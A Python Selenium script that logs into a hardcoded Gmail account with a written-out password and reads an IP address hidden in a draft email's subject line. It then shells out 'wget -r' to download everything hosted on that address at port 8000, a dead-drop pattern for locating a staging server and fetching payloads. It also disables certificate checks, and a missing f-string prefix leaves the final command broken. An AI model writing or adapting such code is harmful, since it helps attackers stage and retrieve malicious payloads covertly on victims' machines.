#Popen runs w get command to grab public IP in another shell (headless)
from subprocess import Popen

#webdriver for automated web browser control
from selenium import webdriver

#miscellaneous web driver libraries and functions used in automation
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import Select

#used to make script wait to give web pages a chance to load
import time

def getPublicIP(driver):
    #possibly redundant, needs testing
    driver.get("https://www.google.com/")
    
    #wait until sign in button is clickable for maximum 10 seconds
    WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "/html/body/div[1]/div[1]/div/div/div/div[2]/a"))
            )

    #click sign in
    driver.find_element(By.XPATH, "/html/body/div[1]/div[1]/div/div/div/div[2]/a").click()
    time.sleep(3)
    
    #Finds email entry form and fills it in
    Email = driver.find_element(By.NAME, "identifier")
    Email.send_keys("infosecpwned87@gmail.com")

    #Wait for next button to be clickable for maximum 10 seconds
    WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CLASS_NAME, "VfPpkd-vQzf8d"))
            )

    #click next 
    driver.find_element(By.CLASS_NAME ,"VfPpkd-vQzf8d").click()

    #Wait for password form entry to be clickable for maximum 10 seconds
    WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.NAME, "password"))
            )

    #finds password entry form and fills it in
    Password = driver.find_element(By.NAME, "password")
    Password.send_keys("YouGotRekt99")
 
    #Wait for next button to be clickable for maximum 10 seconds
    WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CLASS_NAME, "VfPpkd-vQzf8d"))
            )
    
    #click next 
    driver.find_element(By.CLASS_NAME ,"VfPpkd-vQzf8d").click()
    
    #Google will possibly ask you to verify the new device, this will click next if it appears
    #on failure script continues assuming the page did not appear
    try:
        WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.CLASS_NAME, "VfPpkd-vQzf8d"))
                )
        
        driver.find_element(By.CLASS_NAME ,"VfPpkd-vQzf8d").click()
    except:
        pass
    
    #Google will possibly ask you to update your recovery information
    #This will attempt to click confirm if the page shows
    #If it fails, script assumes the page did not appear and script continues
    try:
        WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.CLASS_NAME, "RveJvd snByac"))
                )
        
        driver.find_element(By.CLASS_NAME ,"RveJvd snByac").click()
    except:
        pass

    #Wait for gmail link to be clickable for 10 seconds maximum    
    WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.CLASS_NAME, "gb_d"))
                )
    #Click gmail link
    driver.find_element(By.CLASS_NAME ,"gb_d").click()
   
    #Waits for draft to be clickable for 10 seconds maximum
    WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, "/html/body/div[7]/div[3]/div/div[2]/div[1]/div[1]/div[1]/div/div/div/div[2]/div/div/div[1]/div[1]/div/div[5]/div/div/div[2]/span/a"))
                )
    #Click draft link
    driver.find_element(By.XPATH ,"/html/body/div[7]/div[3]/div/div[2]/div[1]/div[1]/div[1]/div/div/div/div[2]/div/div/div[1]/div[1]/div/div[5]/div/div/div[2]/span/a").click()

    #Waits for draft emails to load and be clickable for maximum of 10 seconds
    WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, "/html/body/div[7]/div[3]/div/div[2]/div[1]/div[2]/div/div/div/div/div[2]/div/div[1]/div/div[2]/div[4]/div[2]/div/table/tbody/tr/td[5]/div/div/div/span/span"))
                )
    
    #Reads text stored in drafts subject line (should be server's public ip)
    Public_IP = driver.find_element(By.XPATH, "/html/body/div[7]/div[3]/div/div[2]/div[1]/div[2]/div/div/div/div/div[2]/div/div[1]/div/div[2]/div[4]/div[2]/div/table/tbody/tr/td[5]/div/div/div/span/span").text
   
    #Close driver
    driver.quit()

    #Return text grabbed from draft email subject line (should be server's public ip)
    return Public_IP

# Use the `install()` method to set `executabe_path` in a new `Service` instance of google chrome:
service = Service(executable_path=ChromeDriverManager().install())

#declare chrome's config with default options
chrome_options = Options()

#argument to make browser detachable
chrome_options.add_experimental_option("detach", True)

#ignores possible certificate errors thrown by the browser and simply continues the script
chrome_options.add_argument('--ignore-certificate-errors')

#allow the automated chrome browser to access http/non-encrypted content
chrome_options.add_argument('--allow-running-insecure-content')

# Defualt service settings for web driver initiated here, and options for chrome congifuration initiated as well
# Stored in driver object
driver = webdriver.Chrome(service=service, options=chrome_options)

#go to google.com
driver.get("https://google.com")

#grabs public IP address of server from clients pre-setup gmail account
Public_IP = getPublicIP(driver)

#creates a valid string for wget command
port = '8000'
Public_IP = Public_IP+':'+port

#print for debugging, remove when in final release
print(Public_IP)

#opens headless shell and downloads all files being hosted on server @ "Public_IP:port" into CWD (current working directory)
Popen('wget -r {Public_IP}', shell=True)
